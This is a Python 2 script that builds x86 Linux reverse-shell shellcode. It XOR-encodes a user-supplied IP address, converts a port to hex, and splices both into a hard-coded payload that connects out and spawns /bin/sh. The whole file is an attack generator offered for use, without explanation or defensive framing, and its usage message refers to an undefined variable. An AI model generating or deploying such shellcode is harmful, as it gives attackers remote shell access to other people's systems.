#!/usr/bin/env python

import sys, socket, struct;
from operator import xor;

def xor_ip_address(original_ip):
    hex_bin_ip          = hex((struct.unpack("<L", socket.inet_aton(original_ip))[0]));
    s = str(hex(xor(long(hex_bin_ip, 16), 0xFFFFFFFF)))[:-1]
    h1 = s[2:4]
    h2 = s[4:6]
    h3 = s[6:8]
    h4 = s[8:10]

    if h1 == "":
        h1 = "00"
    if len(h1) == 1:
        h1 = "0" + h1

    if h2 == "":
        h2 = "00"
    if len(h2) == 1:
        h2 = "0" + h2
    if h3 == "":
        h3 = "00"
    if len(h3) == 1:
        h3 = "0" + h3
    if h4 == "":
        h4 = "00"
    if len(h4) == 1:
        h4 = "0" + h4

    return "\\x%s\\x%s\\x%s\\x%s" % (h4, h3,h2, h1)

def port_to_hex(port):

    if port < 1024 or port > 65535:
        print "[!] invalid TCP port number: " + str(port)
        sys.exit(-1)

    no_port = socket.htons(port);
    hex_no_port = hex(no_port)

    h1 = hex_no_port[2:4]
    h2 = hex_no_port[4:6]

    if h1 == "":
        h1 = "00"

    if len(h1) == 1:
        h1 = "0" + h1

    if h2 == "":
        h2 = "00"

    if len(h2) == 1:
        h2 = "0" + h2

    return "\\x%s\\x%s" % (h2, h1)

if (len(sys.argv) != 3):
    print ("usage: " + argv[0] + " ip port");
    sys.exit(-1);


xored_hex_bin_ip = xor_ip_address(sys.argv[1])
hex_port_number = port_to_hex(int(sys.argv[2]))

print "Creating TCP reverse shell shellcode for IP: " + sys.argv[1] + " on port: " + str(sys.argv[2])
print "XOR'ed IP address translation: " + xored_hex_bin_ip
print "Hex port number translation: " + hex_port_number

shellcode="\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\xb8"+ xored_hex_bin_ip +"\\x83\\xf0\\xff\\x50\\x66\\x68" + hex_port_number + "\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\x31\\xc0\\x66\\xb8\\x6a\\x01\\xcd\\x80\\x85\\xc0\\x75\\x24\\x31\\xc9\\xb1\\x02\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xb3\\x01\\x31\\xc0\\xb0\\x01\\xcd\\x80"

print shellcode

